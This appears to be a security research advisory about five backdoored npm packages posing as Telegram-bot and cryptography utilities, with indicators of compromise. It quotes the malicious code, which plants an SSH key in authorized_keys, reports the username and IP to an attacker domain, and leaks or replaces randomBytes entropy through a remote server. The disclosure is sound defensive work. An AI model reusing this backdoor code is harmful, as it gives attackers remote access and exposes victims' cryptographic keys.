{"hash":"1ca300a615106147e7e6adfd40bf27214a25488c","data":{"realTimePost":{"description":"Andrey Polkovnychenko, JFrog Security Researcher","title":"Five Backdoored Cryptography Packages Operating Undetected for Six Months","date":"October 23, 2025","type":"realTimePost","tag":"Real Time Post","img":"/img/RealTimePostImage/post_thumbnail1.png","path":"/post/npm-backdoored-packages/","content":"<p>Our research team found a npm user jamestonytrump who published five malicious packages containing backdoors. One of them, the npm package “grammy-tools” masquerades as a legitimate library for Telegram bots. The malicious software adds a public key to <code>~/.ssh/authorized_keys</code> and transmits the username and external IP address to <code>grammy[.]validator[.]icu</code>. This action provides an attacker with complete control over the compromised system.</p>\n<p><img src=\"/img/RealTimePostImage/post/npm_backdoor.png\"></p>\n<pre><code class=\"language-javascript\">const publicKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQ`\nconst username = os.userInfo().username;\nconst ipAddress = await getBotId();\nconst fullPublicKey = `${publicKey}`;\nconst sshDir = path.join(os.homedir(), '.ssh');\nconst authorizedKeysPath = path.join(sshDir, 'authorized_keys');\nfs.writeFileSync(authorizedKeysPath, `${fullPublicKey}\\n`, { mode: 0o600 });\nhttps.get(`https://grammy.validator.icu/v1/check?ip=${ipAddress}&#x26;name=${username}&#x26;type=${types}`, (res1) => {   \nres1.on('data', () => { });\n});\n</code></pre>\n<p>The additional four packages: grammy-guards, crypter-validater, crypt-validater,<br>\nnode-crypto-validater follow the same logic of adding a backdoor to the attacked system. Each of them mimics a cryptographic utility, exporting functions typical of legitimate crypto libraries:</p>\n<pre><code class=\"language-javascript\">import * as crypto from \"crypto\";\nexport declare function validate(content: any): any;\nexport declare function createPrivateKey(key: crypto.PrivateKeyInput | string | Buffer | crypto.JsonWebKeyInput, callback?: any): any;\nexport declare function randomBytes(byretes: number, callback?: any): any;\nexport declare function checkPrime(value: crypto.LargeNumberLike, callback?: any): any;\n</code></pre>\n<p>At first glance, this appears to be a thin wrapper over Node’s built-in crypto module. The only difference it makes to the legitimate cryptographic library is the addition of a backdoor in one of the functions. The function randomBytes contains a code that sends the entropy of the generated random values to an attacker-controlled server. The backdoor works differently, depending on the mode in which the original function was called. In blocking mode, it returns the result immediately, so applications receive randomness even as the attacker quietly captures it. But if the function was called in asynchronous mode with a callback, it replaces the result with the bytes returned by the server.</p>\n<p>Either case is catastrophic because random entropy is the core of any cryptographic system. A leak of raw entropy makes any secret, private key, nonce, or other cryptographic data produced by the infected system compromised.  </p>\n<pre><code class=\"language-javascript\">function check_validator(bytes, callback) {\n   if (fetch('https://web3.validator.icu/v1/check', {\n           method: 'POST',\n           body: JSON.stringify({\n               action: 'validator',\n               content: bytes\n           })\n       }).then(res => {\n      callback &#x26;&#x26; res.json().then(res => {\n      res.success ? callback(null, bytes):callback(res.message);\n           });\n       }) {\n       return true;\n   }\n}\n\nfunction randomBytes(size, callback) {\n   const result = crypto.randomBytes(size).toString('hex');\n   return check_validator(result, callback) ? result : null;\n}\n</code></pre>\n<p>We reported these packages to the npm security team and added information about these packages to <a href=\"http://jfrog.com/xray\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JFrog Xray</a> to provide an added layer of security for our customers.</p>\n<p>Check out the <a href=\"https://research.jfrog.com/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JFrog Security Research</a> center for more information about the latest CVEs, vulnerabilities, and fixes to keep your software supply chain secure.</p>\n<h2 id=\"ioc\"><a href=\"#ioc\" aria-hidden=\"true\" tabindex=\"-1\">IOC</a></h2>\n<p>Domain<br>\n<code>web3[.]validator[.]icu</code><br>\nPackages</p>\n<ul>\n<li>grammy-tools - XRAY-736302  </li>\n<li>grammy-guards XRAY-736301  </li>\n<li>crypter-validater XRAY-736304  </li>\n<li>crypt-validater XRAY-736300  </li>\n<li>node-crypto-validater XRAY-736303</li>\n</ul>\n","excerpt":"JFrog Security Research team found five fake cryptography packages in npm that contained backdoor code","minutes":"1"}},"context":{}}